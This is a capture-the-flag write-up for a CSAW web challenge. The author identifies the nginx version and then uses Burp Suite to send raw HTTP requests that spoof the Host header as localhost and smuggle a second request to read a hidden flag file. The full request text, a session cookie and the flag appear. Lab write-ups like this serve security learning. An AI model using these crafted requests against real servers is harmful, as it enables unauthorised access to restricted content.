It is acutally a web vulnerability problem. 
A link was there
[http://web.csaw.io:3009/](http://web.csaw.io:3009/)
After going to the link:
![[Pasted image 20230916214002.png]]
After clicking hint, this page was shown
![[Pasted image 20230916214118.png]]
After using the inspect and going to network:
![[Pasted image 20230916214416.png]]
Here, we can see the server is 
Server: nginx/1.17.6
So, putting it into the form we were directed to this page:
![[Pasted image 20230916214604.png]]
After searching online I found this vulnerability CVE:
https://nvd.nist.gov/vuln/detail/cve-2019-20218#match-8411509
So, after researching a bit, I found out that the vulnerability is  using the redirection to move to private/hidden pages of the site.

When we click on the flag text(http://localhost:3009/flag.txt) in the webpage we are shown:
![[Pasted image 20230916215121.png]]
So, its hidden.

According to the hint, we can access the site by being the localhost.
So, after searching online on how to use this vulnerability, I found out a video where it is similar to our problem.
https://www.youtube.com/watch?v=jimGQpftYWs
After that, I searched online again it the way he did was not working
After searching, I found out a site where he demostrate how to redirection works.
So, I opened burpsuite and written the following thing in the repeater:
```
GET /flag.txt HTTP/1.1
Host: localhost:3009
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://web.csaw.io:3009/flag.txt
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3A7rBkPQHP4_5pRN_fo7Wm4myKEdLnZcbZ.TtmQ0CzsUUSN%2BDd%2Bu2hSnfmn4jsFL1bHjzPXzHSmDdw
Connection: keep-alive
Content-Length: 39

GET /flag.txt HTTP/1.1
Host: localhost
```
Most of it is copied from interceptor. I just put `/flag.txt` insted of `/ ` in `GET /flag.txt HTTP/1.1`
then, I changed `Host: web.csaw.io:3009` to `Host: localhost:3009`
and `Referer: http://web.csaw.io:3009/` to `Referer: http://web.csaw.io:3009/flag.txt`

and finally changed `Connection: close` to `Connection: keep-alive`
and added the following part 
```
GET /flag.txt HTTP/1.1
Host: localhost
```

The result from the repeater is:
![[Pasted image 20230916220128.png]]
Therefore, the flag is:
`csawctf{d0nt_smuggl3_Fla6s_!}`


Edit:
Only this part is required:
```
GET /flag.txt HTTP/1.1
Host: localhost:3009
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://web.csaw.io:3009/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3A7rBkPQHP4_5pRN_fo7Wm4myKEdLnZcbZ.TtmQ0CzsUUSN%2BDd%2Bu2hSnfmn4jsFL1bHjzPXzHSmDdw
Connection: keep-alive
Content-Length: 0
```
Only the change in `/flag.txt` insted of `/ ` in `GET /flag.txt HTTP/1.1` 
and `Host: web.csaw.io:3009` to `Host: localhost:3009` is required.




